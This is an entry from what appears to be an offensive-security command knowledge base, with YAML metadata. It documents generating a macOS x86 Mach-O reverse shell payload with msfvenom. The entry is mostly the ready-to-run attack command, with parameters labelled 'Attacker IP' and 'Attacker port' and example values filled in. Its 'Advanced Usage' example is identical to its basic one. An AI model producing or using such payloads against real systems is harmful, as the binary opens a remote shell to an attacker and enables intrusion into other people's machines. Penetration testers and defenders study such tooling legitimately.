---
id: 7a2bc55c-0953-4325-8d1b-2fd4742c5f61
name: generate-osx-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p osx/x86/shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f macho >
  shell.macho
output: null
created_at: '2023-04-06T03:56:24.923447+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - macOS
tags:
  - reverse-shell
  - macho
verified: true
validated: true
---

# Generate OSX Reverse Shell Payload

## Command

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f macho > shell.macho
```

## Description

Generates a Mach-O binary for macOS x86 reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p osx/x86/shell_reverse_tcp | OSX shell reverse payload | Built-in |
| -f macho | Mach-O format | Built-in |
| > shell.macho | Save to shell.macho | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f macho > shell.macho
```

### Advanced Usage

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f macho > shell.macho
```

## Expected Output

shell.macho binary (~1 KB).

## Related

- [[commands/generate-linux-meterpreter-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
